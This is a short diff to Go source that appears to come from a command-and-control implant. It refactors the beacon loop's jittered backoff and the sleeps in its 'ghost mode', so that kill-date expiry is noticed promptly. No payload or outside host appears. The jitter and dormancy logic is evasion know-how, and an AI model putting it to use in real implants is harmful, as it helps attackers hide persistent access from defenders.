@@ -7,7 +7,6 @@ import (
 	"fmt"
 	"io"
 	"log"
-	mathRand "math/rand"
 	"net"
 	"net/http"
 	"net/url"
@@ -474,7 +473,7 @@ func main() {
 				doBeaconSafe()
 			}
 			for i := 0; i < 24 && isInGhostMode(); i++ {
-				time.Sleep(1 * time.Hour)
+				sleepInterruptible(1 * time.Hour)
 			}
 			continue
 		}
@@ -493,12 +492,14 @@ func main() {
 			// Add jitter: ±25%
 			jitterRange := backoffSec / 4
 			if jitterRange > 0 {
-				backoffSec += int(mathRand.Int31n(int32(2*jitterRange+1))) - jitterRange
+				backoffSec += rng.Intn(2*jitterRange+1) - jitterRange
 			}
 			if Debug {
 				fmt.Printf("[!] Beacon backoff: sleeping %ds (failures=%d)\n", backoffSec, beaconConsecutiveFailures)
 			}
-			time.Sleep(time.Duration(backoffSec) * time.Second)
+			// Interruptible: ghost transitions / kill-date expiry observed
+			// promptly instead of after the full backoff.
+			sleepInterruptible(time.Duration(backoffSec) * time.Second)
 			continue
 		}
 
